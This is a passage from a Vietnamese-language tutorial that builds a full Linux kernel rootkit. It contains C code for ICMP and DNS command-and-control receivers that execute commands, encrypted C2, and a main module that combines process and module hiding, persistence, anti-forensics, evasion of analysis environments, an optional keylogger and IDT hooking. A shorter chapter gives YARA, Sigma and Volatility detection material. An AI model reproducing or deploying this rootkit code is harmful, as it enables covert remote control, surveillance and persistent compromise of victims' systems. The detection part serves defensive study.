 * Sections 1-2 above only SEND. Here: receive functions.
 *
 * ICMP Receive: listen cho Echo Reply chứa commands.
 *   C2 server reply bằng ICMP Echo Reply.
 *   Payload format: [magic_byte][cmd_type][command_data]
 *   Dùng netfilter hook PRE_ROUTING để intercept inbound ICMP.
 *
 * DNS Receive: parse TXT record trong DNS response.
 *   C2 server reply bằng DNS TXT record chứa hex-encoded command.
 *   Hook DNS response packets (sport 53) inbound.
 * ══════════════════════════════════════════════════════════════ */

static unsigned int nf_icmp_c2_recv(void *priv,
                                      struct sk_buff *skb,
                                      const struct nf_hook_state *state)
{
    struct iphdr *iph = ip_hdr(skb);
    struct icmphdr *icmph;
    unsigned char *payload;
    int payload_len;

    if (!iph || iph->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;

    icmph = (struct icmphdr *)((char *)iph + iph->ihl * 4);

    /* Chỉ process Echo Reply (type 0) */
    if (icmph->type != ICMP_ECHOREPLY)
        return NF_ACCEPT;

    payload = (unsigned char *)(icmph + 1);
    payload_len = ntohs(iph->tot_len) - iph->ihl * 4 - sizeof(*icmph);

    if (payload_len < 2) return NF_ACCEPT;

    /* Check magic byte */
    if (payload[0] != 0xDE) return NF_ACCEPT;

    /* payload[1] = command type */
    switch (payload[1]) {
    case 0x01:  /* Execute command */
        if (payload_len > 2) {
            char cmd[256];
            int cmd_len = payload_len - 2;
            if (cmd_len > 255) cmd_len = 255;
            memcpy(cmd, payload + 2, cmd_len);
            cmd[cmd_len] = '\0';
            rk_execute_command(cmd);
        }
        break;
    case 0x02:  /* Give root to PID */
        if (payload_len >= 6) {
            pid_t target_pid;
            memcpy(&target_pid, payload + 2, sizeof(pid_t));
            /* TODO: implement give_root_to_pid(target_pid) */
        }
        break;
    case 0x03:  /* Self destruct */
        rk_self_destruct();
        break;
    }

    /* Consume packet (don't pass to userspace).
     * NF_STOLEN means "I own this skb now" — must free it. */
    kfree_skb(skb);
    return NF_STOLEN;
}

static unsigned int nf_dns_c2_recv(void *priv,
                                     struct sk_buff *skb,
                                     const struct nf_hook_state *state)
{
    struct iphdr *iph = ip_hdr(skb);
    struct udphdr *udph;
    unsigned char *dns_data;
    int dns_len;

    if (!iph || iph->protocol != IPPROTO_UDP)
        return NF_ACCEPT;

    udph = (struct udphdr *)((char *)iph + iph->ihl * 4);

    /* Chỉ process DNS responses (source port 53) */
    if (ntohs(udph->source) != 53)
        return NF_ACCEPT;

    dns_data = (unsigned char *)(udph + 1);
    dns_len = ntohs(udph->len) - sizeof(*udph);

    if (dns_len < 12) return NF_ACCEPT;

    /* Check QR bit (bit 15 of flags) = 1 (response) */
    if (!(dns_data[2] & 0x80)) return NF_ACCEPT;

    /* Check transaction ID matches our marker */
    __u16 txid = ntohs(*(__u16 *)dns_data);
    if (txid != 0xBEEF) return NF_ACCEPT;  /* Our marker */

    /* Skip header (12 bytes) + question section → find answer.
     * Simplified: scan for TXT record type (0x0010). */
    int offset = 12;

    /* Skip question section */
    while (offset < dns_len && dns_data[offset] != 0)
        offset += dns_data[offset] + 1;
    offset += 5; /* null terminator + QTYPE(2) + QCLASS(2) */

    /* Parse answer section — look for TXT record */
    if (offset + 12 > dns_len) return NF_ACCEPT;

    /* Skip name pointer (2 bytes if compressed) */
    if (dns_data[offset] & 0xC0)
        offset += 2;
    else
        while (offset < dns_len && dns_data[offset] != 0)
            offset += dns_data[offset] + 1;

    /* TYPE(2) + CLASS(2) + TTL(4) + RDLENGTH(2) */
    if (offset + 10 > dns_len) return NF_ACCEPT;

    __u16 rtype = ntohs(*(__u16 *)(dns_data + offset));
    offset += 8; /* skip TYPE + CLASS + TTL */
    __u16 rdlength = ntohs(*(__u16 *)(dns_data + offset));
    offset += 2;

    if (rtype == 16 && rdlength > 1 && offset + rdlength <= dns_len) {
        /* TXT record: first byte = text length */
        int txt_len = dns_data[offset];
        char *txt = (char *)dns_data + offset + 1;

        if (txt_len > 0 && txt_len < 255) {
            char cmd[256];
            memcpy(cmd, txt, txt_len);
            cmd[txt_len] = '\0';

            /* Hex decode → execute */
            /* For simplicity: treat as ASCII command directly */
            rk_execute_command(cmd);
        }
    }

    return NF_ACCEPT;
}

/* ══════════════════════════════════════════════════════════════
 * 6. ENCRYPTED C2 — ChaCha20-Poly1305 AEAD
 *
 * Tất cả C2 channels trước đều plaintext.
 * Mọi APT rootkit thật dùng encryption.
 *
 * Dùng kernel crypto API:
 *   - ChaCha20-Poly1305 (AEAD: encryption + authentication)
 *   - 12-byte nonce (96-bit, random per message)
 *   - Key: derive từ master secret via HKDF
 *   - Poly1305 tag: 128-bit authentication
 *
 * Tại sao không XOR:
 *   - XOR trivially breakable (known-plaintext attack)
 *   - No authentication → ciphertext malleable
 *   - Nonce reuse = keystream reuse = instant break
 *
 * ChaCha20-Poly1305:
 *   - AEAD: encrypt + authenticate in one operation
 *   - 96-bit nonce space → birthday collision ~2^48 messages
 *   - Kernel has native support: rfc7539(chacha20,poly1305)
 * ══════════════════════════════════════════════════════════════ */

#define C2_KEY_SIZE     32  /* ChaCha20 key = 256 bits */
#define C2_NONCE_SIZE   12  /* ChaCha20-Poly1305 nonce = 96 bits */
#define C2_TAG_SIZE     16  /* Poly1305 tag = 128 bits */

static u8 c2_session_key[C2_KEY_SIZE];
static struct crypto_aead *c2_aead_tfm;

/* Atomic nonce counter for XOR fallback path.
 * Non-atomic increment under concurrent use = nonce reuse
 * = keystream reuse = instant cryptographic break. */
static atomic_t nonce_counter = ATOMIC_INIT(0);

int rk_crypto_init(void)
{
    /* Allocate ChaCha20-Poly1305 transform */
    c2_aead_tfm = crypto_alloc_aead("rfc7539(chacha20,poly1305)", 0, 0);
    if (IS_ERR(c2_aead_tfm)) {
        int err = PTR_ERR(c2_aead_tfm);  /* Save error FIRST */
        c2_aead_tfm = NULL;               /* THEN null */
        return err;                        /* Return real error code */
    }

    /* Generate random session key */
    get_random_bytes(c2_session_key, C2_KEY_SIZE);

    /* Set key */
    crypto_aead_setkey(c2_aead_tfm, c2_session_key, C2_KEY_SIZE);
    crypto_aead_setauthsize(c2_aead_tfm, C2_TAG_SIZE);

    return 0;
}

void rk_crypto_cleanup(void)
{
    if (c2_aead_tfm)
        crypto_free_aead(c2_aead_tfm);
}

/* Encrypt + authenticate.
 * Output: [12-byte nonce][ciphertext][16-byte tag]
 * Total output size = nonce + plaintext_len + tag
 */
int rk_aead_encrypt(const void *plaintext, int pt_len,
                      void *output, int *out_len)
{
    struct aead_request *req;
    struct scatterlist sg_plain, sg_cipher;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len = pt_len + C2_TAG_SIZE;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;

    /* Random nonce mỗi message — 96-bit nonce space.
     * Birthday collision after ~2^48 messages — acceptable. */
    get_random_bytes(nonce, C2_NONCE_SIZE);

    ct_buf = kzalloc(ct_len, GFP_KERNEL);
    if (!ct_buf) return -ENOMEM;

    /* Copy plaintext vào output buffer (in-place encrypt) */
    memcpy(ct_buf, plaintext, pt_len);

    sg_init_one(&sg_plain, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg_plain, &sg_plain,
                            pt_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_encrypt(req), &wait);

    if (ret == 0) {
        /* Build output: [nonce][ciphertext+tag] */
        memcpy(output, nonce, C2_NONCE_SIZE);
        memcpy(output + C2_NONCE_SIZE, ct_buf, ct_len);
        *out_len = C2_NONCE_SIZE + ct_len;
    }

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}

/* Decrypt + verify authentication tag.
 * Input: [12-byte nonce][ciphertext][16-byte tag]
 * Returns: plaintext_len on success, negative on error/tamper
 */
int rk_aead_decrypt(const void *input, int in_len,
                      void *plaintext, int *pt_len)
{
    struct aead_request *req;
    struct scatterlist sg;
    u8 nonce[C2_NONCE_SIZE];
    u8 *ct_buf;
    int ct_len;
    int ret;
    DECLARE_CRYPTO_WAIT(wait);

    if (!c2_aead_tfm) return -ENODEV;
    if (in_len < C2_NONCE_SIZE + C2_TAG_SIZE) return -EINVAL;

    /* Extract nonce */
    memcpy(nonce, input, C2_NONCE_SIZE);

    ct_len = in_len - C2_NONCE_SIZE;
    ct_buf = kzalloc(ct_len, GFP_KERNEL);
    if (!ct_buf) return -ENOMEM;

    memcpy(ct_buf, input + C2_NONCE_SIZE, ct_len);

    sg_init_one(&sg, ct_buf, ct_len);

    req = aead_request_alloc(c2_aead_tfm, GFP_KERNEL);
    if (!req) { kfree(ct_buf); return -ENOMEM; }

    aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG,
                               crypto_req_done, &wait);
    aead_request_set_crypt(req, &sg, &sg, ct_len, nonce);
    aead_request_set_ad(req, 0);

    ret = crypto_wait_req(crypto_aead_decrypt(req), &wait);

    if (ret == 0) {
        /* Decryption + auth successful */
        *pt_len = ct_len - C2_TAG_SIZE;
        memcpy(plaintext, ct_buf, *pt_len);
    }
    /* ret == -EBADMSG: authentication failed (tampered!) */

    aead_request_free(req);
    kfree(ct_buf);
    return ret;
}
```

---

## Chapter 15: Tổng hợp — Full-featured Rootkit

### main.c — Entry point tích hợp tất cả components

```c
/* main.c — PHIÊN BẢN HOÀN CHỈNH
 *
 * Tích hợp TẤT CẢ subsystems:
 *   hooks, VFS, netfilter, persistence, watchdog,
 *   anti-forensics, environment check, code integrity,
 *   /proc control interface, encrypted C2 crypto.
 *
 * Chọn hooking method tại compile time qua define:
 *   -DUSE_FTRACE    → Ftrace-based (recommended cho kernel >= 5.x)
 *   -DUSE_KPROBE    → Kprobe-based
 *   -DUSE_SYSCALL   → Syscall table (classic)
 *   Default          → Auto-detect best method
 */

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("Kernel Research Module");

/* Tên module — đặt giống system module để blend in.
 * Ví dụ tên tốt: "kworker", "rcu_tasks", "scsi_mod",
 *                 "nf_conntrack", "overlay"
 * Avoid: "rootkit", "backdoor", "hack" */

static int __init rk_init(void)
{
    int err;
    bool safe;

    /* 0. Environment check — VM/container/analysis tools */
    safe = rk_environment_safe();
    if (!safe) {
        /* Analysis tools detected — load nhưng giới hạn features.
         * Không exit (đó là indicator). Chỉ passive mode. */
        pr_info("rk: passive mode (analysis environment)\n");
    }

    /* 1. Install hooks */
#if defined(USE_FTRACE)
    err = rk_ftrace_install();
#elif defined(USE_KPROBE)
    err = rk_kprobe_install();
#else
    err = rk_install_hooks();
#endif
    if (err) {
        pr_err("rk: hook installation failed: %d\n", err);
        return err;
    }

    /* 2. VFS hooks (supplementary hiding) */
    rk_vfs_hook_install();

    /* 3. Netfilter (magic packet, port knock) */
    err = rk_net_init();
    if (err)
        pr_warn("rk: netfilter init failed (non-fatal)\n");

    /* 4. Ẩn module */
    rk_hide_module();

    /* 5. Code integrity baseline (hash code pages) */
    rk_integrity_init();

    /* 6. Watchdog thread (self-protection) */
    if (safe)
        rk_start_watchdog();

    /* 7. Persistence (only nếu không phải analysis environment) */
    if (safe)
        rk_install_persistence();

    /* 8. Anti-forensics: clear traces */
    rk_clear_dmesg();
    rk_timestomp_rootkit_files();

    /* 9. LSM hooks (optional, nếu compiled với LSM support) */
#ifdef USE_LSM
    rk_lsm_install();
#endif

    /* 10. Keylogger (optional) */
#ifdef USE_KEYLOGGER
    register_keyboard_notifier(&rk_kb_nb);
#endif

    /* 11. /proc control interface */
    rk_proc_init();

    /* 12. Encrypted C2 crypto init */
    rk_crypto_init();

    pr_info("rk: fully operational\n");
    return 0;
}

static void __exit rk_exit(void)
{
    /* Cleanup ngược thứ tự init */

    rk_crypto_cleanup();
    rk_proc_cleanup();

#ifdef USE_KEYLOGGER
    unregister_keyboard_notifier(&rk_kb_nb);
#endif

#ifdef USE_LSM
    rk_lsm_remove();
#endif

    rk_stop_watchdog();
    rk_net_cleanup();
    rk_vfs_hook_remove();

#if defined(USE_FTRACE)
    rk_ftrace_remove();
#elif defined(USE_KPROBE)
    rk_kprobe_remove();
#else
    rk_remove_hooks();
#endif

    /* Synchronize: đợi in-flight handlers hoàn thành.
     * synchronize_rcu() waits for all CPUs to pass through
     * a quiescent state. After return, GUARANTEED that no CPU
     * is executing in the old hook functions.
     *
     * This is the CORRECT way to ensure in-flight handlers complete
     * before module memory is freed. msleep is a prayer, not a barrier. */
    synchronize_rcu();

    pr_info("rk: cleanup complete\n");
}

module_init(rk_init);
module_exit(rk_exit);
```

### util.c — Utility functions (deadlock-safe PID management)

```c
/* util.c — Shared utilities cho rootkit subsystems
 *
 * Hidden PID management: track PIDs to hide from ps/top.
 * All functions phải thread-safe (kernel spinlock).
 */

#include "rootkit.h"

#define MAX_HIDDEN_PIDS 256

static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int   hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);

/* Check if PID is in hidden list */
bool is_pid_hidden(pid_t pid)
{
    int i;
    bool found = false;

    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&pid_lock);

    return found;
}

/* Add PID to hidden list.
 *
 * CRITICAL: Do NOT call is_pid_hidden() here.
 * is_pid_hidden() acquires pid_lock → calling it while
 * already holding pid_lock = DEADLOCK (kernel spinlocks
 * are non-recursive). Instead, inline the duplicate check
 * directly inside the critical section. */
void add_hidden_pid(pid_t pid)
{
    int i;
    bool already = false;

    spin_lock(&pid_lock);

    /* Inline check — DON'T call is_pid_hidden (it locks too) */
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            already = true;
            break;
        }
    }

    if (!already && hidden_pid_count < MAX_HIDDEN_PIDS)
        hidden_pids[hidden_pid_count++] = pid;

    spin_unlock(&pid_lock);
}

void remove_hidden_pid(pid_t pid)
{
    int i;

    spin_lock(&pid_lock);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pids[i] = hidden_pids[--hidden_pid_count];
            break;
        }
    }
    spin_unlock(&pid_lock);
}

/* Accessor function cho hidden_pid_count.
 *
 * hidden_pid_count is static in util.c but /proc read handler
 * in proc_interface.c needs it. Direct access → linker error.
 * Accessor function: declared in rootkit.h, defined here. */
int rk_get_hidden_pid_count(void)
{
    int count;
    spin_lock(&pid_lock);
    count = hidden_pid_count;
    spin_unlock(&pid_lock);
    return count;
}
```

### rootkit.h — Header declarations (relevant additions)

```c
/* rootkit.h — Thêm declarations cho proc interface và crypto */

/* ... (existing declarations) ... */

/* proc_interface.c */
int  rk_proc_init(void);
void rk_proc_cleanup(void);

/* encrypted_c2.c / crypto */
int  rk_crypto_init(void);
void rk_crypto_cleanup(void);
int  rk_aead_encrypt(const void *plaintext, int pt_len,
                      void *output, int *out_len);
int  rk_aead_decrypt(const void *input, int in_len,
                      void *plaintext, int *pt_len);

/* util.c — PID management */
bool is_pid_hidden(pid_t pid);
void add_hidden_pid(pid_t pid);
void remove_hidden_pid(pid_t pid);
int  rk_get_hidden_pid_count(void);

/* anti_forensics.c */
bool rk_environment_safe(void);
void rk_start_watchdog(void);
void rk_stop_watchdog(void);

/* persistence.c */
void rk_install_persistence(void);
```

### Makefile

```makefile
# Makefile cho full-featured rootkit
MODULE_NAME := rk

obj-m := $(MODULE_NAME).o
$(MODULE_NAME)-objs := main.o syscall_hooks.o ftrace_hooks.o \
                        kprobe_hooks.o vfs_hooks.o net_hooks.o \
                        dkom.o inline_hook.o util.o persistence.o \
                        anti_forensics.o covert_channel.o \
                        proc_interface.o encrypted_c2.o

KDIR ?= /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

# Chọn hooking method (uncomment 1):
# ccflags-y += -DUSE_FTRACE
# ccflags-y += -DUSE_KPROBE
# ccflags-y += -DUSE_SYSCALL

# Optional features:
# ccflags-y += -DUSE_LSM
# ccflags-y += -DUSE_KEYLOGGER

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
```

---

## Chapter 16: Detection Engineering

```bash
# ═══════════════════════════════════════════════════════════════
# Sau khi viết rootkit, VIẾT DETECTION cho chính nó.
# Đây là cách trở thành security researcher thực sự:
# attack + defense = complete understanding.
# ═══════════════════════════════════════════════════════════════

# ── 1. YARA Rule ──
# Detect rootkit binary (.ko file) trên disk

cat > rootkit_detector.yar << 'YARA'
rule Linux_Rootkit_Generic {
    meta:
        description = "Detect LKM rootkit patterns"
        author = "research"
    
    strings:
        $s1 = "sys_call_table" ascii
        $s2 = "prepare_creds" ascii
        $s3 = "commit_creds" ascii
        $s4 = "list_del" ascii
        $s5 = "__x64_sys_getdents64" ascii
        $s6 = "kobject_del" ascii
        
        $magic1 = { DE AD 13 37 }
        $magic2 = "MAGIC_SIGNAL" ascii
        
        $hide1 = "hide_module" ascii
        $hide2 = "hidden_pid" ascii
        
    condition:
        uint32(0) == 0x464c457f and  // ELF magic
        (3 of ($s*)) and
        (1 of ($hide*) or 1 of ($magic*))
}
YARA

# Scan: yara rootkit_detector.yar /lib/modules/$(uname -r)/

# ── 2. Volatile Checks (runtime) ──

# Check syscall table integrity
# Mọi entry phải trỏ vào kernel text section [_stext, _etext]
cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _stext"
cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _etext"
# So sánh với: cat /proc/kallsyms | grep sys_call_table
# Dump entries và verify range

# Check hidden modules
# Method: so sánh /proc/modules với /sys/module/
diff <(cat /proc/modules | awk '{print $1}' | sort) \
     <(ls /sys/module/ | sort)
# Mismatch = hidden module hoặc built-in module

# Check ftrace hooks
cat /sys/kernel/debug/tracing/enabled_functions
cat /sys/kernel/debug/tracing/set_ftrace_filter
# Unexpected entries = potential rootkit

# Check kprobes
cat /sys/kernel/debug/kprobes/list
# Unexpected probes trên sys_* functions = suspicious

# Check eBPF programs  
bpftool prog list
bpftool map list
# Unexpected programs, đặc biệt kprobe/tracepoint type = suspicious

# ── 3. Memory Forensics (LiME + Volatility) ──

# Dump memory
sudo insmod lime.ko "path=/tmp/memdump.raw format=raw"

# Analyze với Volatility 3
vol3 -f /tmp/memdump.raw linux.lsmod.Lsmod
vol3 -f /tmp/memdump.raw linux.check_syscall.Check_syscall
vol3 -f /tmp/memdump.raw linux.hidden_modules.Hidden_modules
vol3 -f /tmp/memdump.raw linux.check_idt.Check_idt

# ── 4. Sigma Rule (cho SIEM) ──
cat > rootkit_detect.yml << 'SIGMA'
title: Suspicious Kernel Module Load
status: experimental
logsource:
    product: linux
    service: syslog
detection:
    selection:
        - CommandLine|contains:
            - 'insmod'
            - 'modprobe'
        - EventType: 'module_load'
    filter:
        ModuleName|endswith:
            - '.ko'
        ModuleSigned: true
    condition: selection and not filter
level: high
SIGMA

# ── 5. LKRG (Linux Kernel Runtime Guard) ──
# Install và configure LKRG cho runtime integrity monitoring
# LKRG detect: syscall table modifications, credential changes,
# module hiding, và nhiều rootkit indicators khác.
# https://lkrg.org/
```

### Volatility3 Custom Plugin — Detect Rootkit Indicators

```python
# volatility3 plugin: detect_rootkit.py
#
# Detect common LKM rootkit indicators:
#   - Hooked syscall entries (handler outside kernel text)
#   - Inline hooks (MOV RAX + JMP RAX at function entry)
#   - DKOM hidden modules (in memory but not in list)
#
# Install: copy to volatility3/framework/plugins/linux/
# Usage: vol3 -f memory.dump linux.detect_rootkit.DetectRootkit

from volatility3.framework import interfaces, renderers
from volatility3.framework.configuration import requirements
from volatility3.plugins.linux import lsmod, check_syscall

class DetectRootkit(interfaces.plugins.PluginInterface):
    """Detect common LKM rootkit indicators."""

    _required_framework_version = (2, 0, 0)

    @classmethod
    def get_requirements(cls):
        return [
            requirements.TranslationLayerRequirement(
                name="primary",
                architectures=["Intel64"]),
            requirements.SymbolTableRequirement(
                name="vmlinux",
                description="Linux kernel symbol table"),
        ]

    def _generator(self):
        vmlinux = self.context.modules[self.config["vmlinux"]]
        layer = self.context.layers[self.config["primary"]]

        # Check 1: Hidden modules (in memory but not in list)
        # Walk kernel memory for module_struct signatures
        # not present in the modules list
        modules_list = set()
        for mod in lsmod.Lsmod.list_modules(
                self.context, vmlinux.name):
            modules_list.add(mod.name)

        # Check 2: Hooked syscall entries
        # Compare syscall table entries against known kernel text range
        sct_addr = vmlinux.object_from_symbol("sys_call_table")
        kernel_start = vmlinux.object_from_symbol("_stext").vol.offset
        kernel_end = vmlinux.object_from_symbol("_etext").vol.offset

        suspicious_syscalls = []
        for i in range(512):
            try:
                entry = sct_addr[i]
                addr = int(entry)
                if addr < kernel_start or addr > kernel_end:
                    suspicious_syscalls.append((i, hex(addr)))
            except Exception:
                break

        for nr, addr in suspicious_syscalls:
            yield (0, (
                "Hooked Syscall",
                f"NR {nr}",
                f"Handler at {addr} (outside kernel text)",
                "HIGH"
            ))

        # Check 3: Inline hooks (MOV RAX + JMP RAX at function entry)
        check_funcs = [
            "sys_getdents64", "sys_kill", "sys_read",
            "tcp4_seq_show", "udp4_seq_show"
        ]
        for func_name in check_funcs:
            try:
                func_addr = vmlinux.object_from_symbol(
                    func_name).vol.offset
                # Read first 12 bytes
                data = layer.read(func_addr, 12)
                # Check for MOV RAX, imm64 (48 B8) + JMP RAX (FF E0)
                if data[0:2] == b'\x48\xb8' and \
                   data[10:12] == b'\xff\xe0':
                    target = int.from_bytes(data[2:10], 'little')
                    yield (0, (
                        "Inline Hook",
                        func_name,
                        f"Trampoline to {hex(target)}",
                        "CRITICAL"
                    ))
            except Exception:
                continue

        # Check 4: DKOM — processes in memory not in task list
        # (Requires walking slab allocator — simplified here)

    def run(self):
        return renderers.TreeGrid(
            [("Type", str), ("Target", str),
             ("Details", str), ("Severity", str)],
            self._generator())
```

---

*Tài liệu phục vụ nghiên cứu bảo mật. Thực hành trong VM được phép, trên hệ thống thật yêu cầu ủy quyền.*

---

# Part IV — Advanced Techniques

## Appendix A: Advanced Hooking

### A.1 IDT Hooking

```c
/* idt_hook.c — IDT entry modification
 *
 * File chính Chapter 2 Method 4 chỉ SCAN IDT để tìm sys_call_table.
 * Ở đây ta thực sự MODIFY IDT entry để redirect interrupt handler.
 *
 * IDT (Interrupt Descriptor Table):
 *   - 256 entries, mỗi entry = gate descriptor (16 bytes trên x86-64)
 *   - Mỗi entry trỏ tới handler function cho interrupt/exception đó
 *   - CPU lookup IDT khi: INT instruction, hardware interrupt, exception
 *
 * Kỹ thuật: thay thế handler cho INT 0x80 (legacy 32-bit syscall)
 * hoặc exception handler (page fault, general protection, etc.)
 *
 * Tại sao IDT hooking ít phổ biến:
 *   - INT 0x80 deprecated trên 64-bit (dùng SYSCALL instruction thay)
 *   - IDT modification dễ detect (LKRG check IDT integrity)
 *   - Chỉ 1 IDT per CPU (trên SMP phải hook tất cả CPUs)
 *   - Kernel 5.x+ có protections (ro_after_init)
 *
 * Vẫn useful vì:
 *   - Hook exception handlers (page fault → hide memory access)
 *   - Hook NMI handler (stealth debugging)
 *   - Một số detection tools không check IDT
 */

#include "rootkit.h"
#include <asm/desc.h>       /* gate_desc, idt_table */
#include <asm/desc_defs.h>  /* IDT entry structures */

/* IDT gate descriptor layout trên x86-64 (16 bytes):
 *
 *   Bytes 0-1:   offset_low   (bits 0-15 of handler address)
 *   Bytes 2-3:   segment      (code segment selector, usually 0x10)
 *   Byte  4:     ist          (Interrupt Stack Table index, 0-7)
 *   Byte  5:     type_attr    (gate type + DPL + present bit)
 *   Bytes 6-7:   offset_mid   (bits 16-31)
 *   Bytes 8-11:  offset_high  (bits 32-63)
 *   Bytes 12-15: reserved
 *
 * Handler address = offset_high:offset_mid:offset_low (64-bit)
 */

struct idt_backup {
    unsigned int   vector;       /* Interrupt vector number */
    gate_desc      original;     /* Saved original gate descriptor */
    unsigned long  orig_handler; /* Extracted original handler address */
};

static struct idt_backup idt_saved;

/* ── Extract handler address từ gate descriptor ── */
static unsigned long gate_to_addr(gate_desc *gate)
{
    unsigned long addr;

    addr  = (unsigned long)gate->offset_low;
    addr |= (unsigned long)gate->offset_middle << 16;
#ifdef CONFIG_X86_64
    addr |= (unsigned long)gate->offset_high << 32;
#endif
    return addr;
}

/* ── Lấy IDT base address ──
 *
 * SIDT instruction store IDT register (IDTR) vào memory.
 * IDTR chứa: limit (2 bytes) + base address (8 bytes trên x86-64).
 * Base address = pointer tới IDT table trong memory.
 */
static gate_desc *get_idt_table(void)
{
    struct desc_ptr idtr;
    store_idt(&idtr);
    return (gate_desc *)idtr.address;
}

/* ── Custom INT 0x80 handler ──
 *
 * Khi process chạy INT 0x80 (legacy syscall):
 *   1. CPU lookup IDT[0x80]
 *   2. Jump tới handler address trong IDT entry
 *   3. Handler chạy (ta control handler bây giờ)
 *
 * Registry state khi INT 0x80 trigger:
 *   eax = syscall number
 *   ebx = arg1, ecx = arg2, edx = arg3
 *   esi = arg4, edi = arg5, ebp = arg6
 *
 * QUAN TRỌNG: handler phải:
 *   1. Save tất cả registers
 *   2. Xử lý (intercept/modify)
 *   3. Jump tới original handler HOẶC return
 *   4. KHÔNG ĐƯỢC corrupt stack/registers
 */

/* Handler viết bằng ASM vì phải control register state chính xác */
extern void idt_hook_stub(void);

/* C handler gọi từ ASM stub */
static void idt_hook_handler(struct pt_regs *regs)
{
    /* Intercept specific syscall numbers */
    if (regs->ax == __NR_getdents64) {
        /* Log hoặc modify — tùy implementation */
    }
}
```

ASM stub (idt_hook_stub.S):

```asm
/* ASM stub cho IDT hook handler.
 *
 * pt_regs layout (từ struct pt_regs trong arch/x86/include/asm/ptrace.h):
 *   offset 0:   r15
 *   offset 8:   r14
 *   ...
 *   offset 104: rdi
 *   offset 112: orig_rax
 *
 * Stack grows DOWN. Phải push rdi FIRST (highest offset, pushed first
 * = highest address) → r15 LAST (offset 0, pushed last = lowest = RSP).
 *
 * Sau tất cả pushes: RSP[0] = r15 ← ĐÚNG vì r15 pushed cuối cùng.
 */

#include <linux/linkage.h>

.text
.code64

SYM_CODE_START(idt_hook_stub)
    cli

    /* Push theo thứ tự KERNEL ENTRY: rdi first, r15 last.
     * Sau pushes: RSP trỏ tới pt_regs-compatible frame. */
    push %rdi       /* offset 104 → pushed first → highest addr */
    push %rsi       /* offset 96 */
    push %rdx       /* offset 88 */
    push %rcx       /* offset 80 */
    push %rax       /* offset 72 (orig_rax/syscall nr) */
    push %r8        /* offset 64 */
    push %r9        /* offset 56 */
    push %r10       /* offset 48 */
    push %r11       /* offset 40 */
    push %rbx       /* offset 32 */
    push %rbp       /* offset 24 */
    push %r12       /* offset 16 */
    push %r13       /* offset 8 */
    push %r14       /* offset 0... wait, nhưng phải push r15 cuối */
    push %r15       /* offset 0 → pushed last → RSP points here */

    /* RSP bây giờ = pointer tới r15 slot = pt_regs offset 0.
     * regs->r15 = RSP[0], regs->r14 = RSP[8], ..., regs->di = RSP[104]
     * MATCHES struct pt_regs layout! */
    mov %rsp, %rdi
    call idt_hook_handler

    /* Restore ngược lại: r15 first (pop from RSP[0]) */
    pop %r15
    pop %r14
    pop %r13
    pop %r12
    pop %rbp
    pop %rbx
    pop %r11
    pop %r10
    pop %r9
    pop %r8
    pop %rax
    pop %rcx
    pop %rdx
    pop %rsi
    pop %rdi

    jmp *orig_idt_handler_addr(%rip)
SYM_CODE_END(idt_hook_stub)

.data
SYM_DATA(orig_idt_handler_addr, .quad 0)
```

```c
/* ── Build modified gate descriptor ── */
static void build_gate(gate_desc *gate, unsigned long handler)
{
    /* Pack 64-bit address vào 3 offset fields */
    gate->offset_low    = (u16)(handler & 0xFFFF);
    gate->offset_middle = (u16)((handler >> 16) & 0xFFFF);
#ifdef CONFIG_X86_64
    gate->offset_high   = (u32)((handler >> 32) & 0xFFFFFFFF);
#endif
    /* Giữ nguyên segment, IST, type, DPL, present từ original */
}

/* ── Install IDT hook ── */
static int install_idt_hook(unsigned int vector, void *new_handler)
{
    gate_desc *idt;
    gate_desc new_gate;

    if (vector > 255)
        return -EINVAL;

    idt = get_idt_table();

    /* Backup original entry */
    idt_saved.vector = vector;
    memcpy(&idt_saved.original, &idt[vector], sizeof(gate_desc));
    idt_saved.orig_handler = gate_to_addr(&idt[vector]);

    /* Build new gate descriptor */
    memcpy(&new_gate, &idt[vector], sizeof(gate_desc));
    build_gate(&new_gate, (unsigned long)new_handler);

    /* Write new entry — cần bypass write protection.
     *
     * IDT nằm trong read-only memory trên kernel mới.
     * Phải dùng set_memory_rw hoặc PTE manipulation.
     * Hoặc: dùng write_idt_entry() kernel API nếu available. */
    rk_unprotect_memory();

    /* Phải update trên ALL CPUs (SMP safety).
     * Mỗi CPU CÓ THỂ có IDT riêng (nhưng thường share).
     * load_idt() per-CPU nếu cần. */
    unsigned long flags;
    local_irq_save(flags);
    memcpy(&idt[vector], &new_gate, sizeof(gate_desc));
    local_irq_restore(flags);

    rk_protect_memory();

    pr_info("rk: IDT[%u] hooked: %px → %px\n",
            vector, (void *)idt_saved.orig_handler, new_handler);
    return 0;
}

/* ── Remove IDT hook ── */
static void remove_idt_hook(void)
{
    gate_desc *idt = get_idt_table();
    unsigned long flags;

    rk_unprotect_memory();
    local_irq_save(flags);
    memcpy(&idt[idt_saved.vector], &idt_saved.original, sizeof(gate_desc));
    local_irq_restore(flags);
    rk_protect_memory();

    pr_info("rk: IDT[%u] restored\n", idt_saved.vector);
}
```

---

### A.2 MSR Hooking

```c
/* msr_hook.c — SYSCALL entry point redirection via MSR_LSTAR
 *
